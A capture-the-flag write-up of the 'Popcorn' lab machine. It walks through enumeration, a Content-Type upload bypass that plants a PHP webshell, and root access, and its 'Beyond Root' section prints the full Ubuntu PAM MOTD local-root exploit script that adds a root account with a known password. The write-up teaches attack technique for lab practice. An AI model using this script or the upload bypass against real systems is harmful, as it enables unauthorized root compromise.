# Popcorn

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 10000 10.129.36.23
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-22 10:43 EST
Nmap scan report for 10.129.36.23
Host is up (0.011s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Web exploit based again.

### Port 80

Visiting port 80 reveals a default html page.

<figure><img src="../../../.gitbook/assets/image (2320).png" alt=""><figcaption></figcaption></figure>

I ran a `gobuster` scan and found a few directories.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -u http://10.129.36.23 -x php,html,txt -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.36.23
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2023/01/22 10:44:39 Starting gobuster in directory enumeration mode
===============================================================
/test                 (Status: 200) [Size: 47046]
/test.php             (Status: 200) [Size: 47058]
/index                (Status: 200) [Size: 177]
/.html                (Status: 403) [Size: 285]
/index.html           (Status: 200) [Size: 177]
/torrent              (Status: 301) [Size: 314] [-> http://10.129.36.23/torrent/]
/rename               (Status: 301) [Size: 313] [-> http://10.129.36.23/rename/]
/.html                (Status: 403) [Size: 285]
```

There were a couple of directories to look at. The first was this `test.php` file which revealed the page for `phpinfo();`.

Here, we can find the PHP version that is running on the server.

<figure><img src="../../../.gitbook/assets/image (3219).png" alt=""><figcaption></figcaption></figure>

PHP version 5.2.10 is insecure by today's standards, however without access to the `cgi-bin`, we cannot exploit this.&#x20;

`/torrent` revealed a BitTorrent instance.&#x20;

<figure><img src="../../../.gitbook/assets/image (507).png" alt=""><figcaption></figcaption></figure>

Lastly, on the `/rename` file, we see this API in play:

<figure><img src="../../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

Perhaps this could be used to rename a file we have uploaded somehow...

### File Upload RCE

On the BitTorrent instance, I registered an account. Here, I found that we are able to upload torrents to the machine:

<figure><img src="../../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

Uploading a `.txt` file resulted in a `This is not a valid torrent file` error. We clearly need to bypass this file upload restriction somehow. In this case, I attempted to upload a `cmd.php` file but it also did not work.

Seems that this was not the right page to be exploiting. So I looked elsewhere and found that the creator uploaded another file when I clicked on Browse.

<figure><img src="../../../.gitbook/assets/image (813).png" alt=""><figcaption></figcaption></figure>

Interestingly, the owner was able to upload a torrent file with **screenshots**.

<figure><img src="../../../.gitbook/assets/image (3884).png" alt=""><figcaption></figcaption></figure>

I then tried to download a torrent file from the Kali Linux official website (because nowhere else offered non-shady torrent files to download). This worked in the uploading. Afterwards, I can see that we are able to 'Edit this torrent'&#x20;

<figure><img src="../../../.gitbook/assets/image (1148).png" alt=""><figcaption></figcaption></figure>

Clicking created a pop-up where I was allowed to upload a screenshot.&#x20;

<figure><img src="../../../.gitbook/assets/image (2366).png" alt=""><figcaption></figcaption></figure>

Take note of the allowed types of images. Attempting to upload a PHP webshell doesn't work (obviously). So I tried to change the `Content-Type` header to `image/jpg`. This worked.

<figure><img src="../../../.gitbook/assets/image (2370).png" alt=""><figcaption></figcaption></figure>

Now, I need to find a way to access this shell. Running a quick `gobuster` on the `/torrent` directory reveals an `uploads` directory is present.

Here I was able to find a PHP file uploaded on today's date.

<figure><img src="../../../.gitbook/assets/image (2652).png" alt=""><figcaption></figcaption></figure>

And we can confirm we have RCE using `curl`.

```bash
$ curl http://popcorn.htb/torrent/upload/2f0dd1f17d87f07b593c479d3257ca18635e0b17.php?cmd=id                                               
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now, we can easily gain a reverse shell as `www-data`. We can also read the user flag as this user.

## Privilege Escalation

### TorrentHoster

Within the `/home/george` directory, we can find a `.zip` file of interest.

```
www-data@popcorn:/home/george$ ls
torrenthoster.zip  user.txt
```

When unzipped, this revealed a backup of the BitTorrent files. Nothing interseting here!

### Path 1: Dirty Cow

This was a really old machine, so obviously kernel exploits for this work.

```
# output from linpeas
[+] Operative system                                                                         
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits              
Linux version 2.6.31-14-generic-pae (buildd@rothera) (gcc version 4.4.1 (Ubuntu 4.4.1-4ubuntu8) ) #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009
```

The Linux version of 2.6.31 was vulnerable to the Dirty Cow exploit, which is not the intended method but still works.&#x20;

### Path 2: Motd Exploit

When looking into the files the user had, I found one really interesting one, which was the `motd` files.

```
www-data@popcorn:/home/george/.cache$ ls -al
total 8
drwxr-xr-x 2 george george 4096 Mar 17  2017 .
drwxr-xr-x 3 george george 4096 Oct 26  2020 ..
-rw-r--r-- 1 george george    0 Mar 17  2017 motd.legal-displayed
```

This was interesting because **there are exploits related to this**. I found one here:

{% embed url="https://www.exploit-db.com/exploits/14339" %}

When the script was downloaded and run, I was able to spawn in a root shell.

<figure><img src="../../../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

## Beyond Root

I wanted to take a look at how this script works.

```bash
#!/bin/bash

P='toor:x:0:0:root:/root:/bin/bash'
S='toor:$6$tPuRrLW7$m0BvNoYS9FEF9/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::'
echo "[*] Ubuntu PAM MOTD local root"
[ -z "$(which ssh)" ] && echo "[-] ssh is a requirement" && exit 1
[ -z "$(which ssh-keygen)" ] && echo "[-] ssh-keygen is a requirement" && exit 1
[ -z "$(ps -u root |grep sshd)" ] && echo "[-] a running sshd is a requirement" && exit 1
backup() {
    [ -e "$1" ] && [ -e "$1".bak ] && rm -rf "$1".bak
    [ -e "$1" ] || return 0
    mv "$1"{,.bak} || return 1
    echo "[*] Backuped $1"
}
restore() {
    [ -e "$1" ] && rm -rf "$1"
    [ -e "$1".bak ] || return 0
    mv "$1"{.bak,} || return 1
    echo "[*] Restored $1"
}
key_create() {
    backup ~/.ssh/authorized_keys
    ssh-keygen -q -t rsa -N '' -C 'pam' -f "$KEY" || return 1
    [ ! -d ~/.ssh ] && { mkdir ~/.ssh || return 1; }
    mv "$KEY.pub" ~/.ssh/authorized_keys || return 1
    echo "[*] SSH key set up"
}
key_remove() {
    rm -f "$KEY"
    restore ~/.ssh/authorized_keys
    echo "[*] SSH key removed"
}
own() {
    [ -e ~/.cache ] && rm -rf ~/.cache
    ln -s "$1" ~/.cache || return 1
    echo "[*] spawn ssh"
    ssh -o 'NoHostAuthenticationForLocalhost yes' -i "$KEY" localhost true
    [ -w "$1" ] || { echo "[-] Own $1 failed"; restore ~/.cache; bye; }
    echo "[+] owned: $1"
}
bye() {
    key_remove
    exit 1
}
KEY="$(mktemp -u)"
key_create || { echo "[-] Failed to setup SSH key"; exit 1; }
backup ~/.cache || { echo "[-] Failed to backup ~/.cache"; bye; }
own /etc/passwd && echo "$P" >> /etc/passwd
own /etc/shadow && echo "$S" >> /etc/shadow
restore ~/.cache || { echo "[-] Failed to restore ~/.cache"; bye; }
key_remove
echo "[+] Success! Use password toor to get root"
su -c "sed -i '/toor:/d' /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \
  chgrp shadow /etc/shadow; nscd -i passwd >/dev/null 2>&1; bash" toor
```

The vulnerability exploited here is how permissions of files changes depending on who is spawning the SSH process. For this machine, if we were to SSH in as `www-data`, a `.cache` file would be created that is owned by `www-data`. Afterwards, we can simply delete this file and replace it with a symlink to another file.&#x20;

A subsequent login would cause the permissions of the symlinked file to be owned by `www-data`.&#x20;

Here's what the script is doing:

1. Create a new SSH key and move it to the `~` directory, which is at the `/var/www` directory for `www-data`.
2. Make a backup of the key (which failed actually).
3. Next, spawn an SSH process as `www-data`. When this is triggered, a `.cache` file is generated in `/var/www` owned by `www-data`.&#x20;
4. The `.cache` file is then deleted. A symlink called `.cache`is created to another file (for this script it is `/etc/passwd` first).&#x20;
5. A subsequent SSH process again then forces the `/etc/passwd` permissions to change and be owned by `www-data`.&#x20;
6. Afterwards, the script appends another root user with a known password to generate the root shell.&#x20;
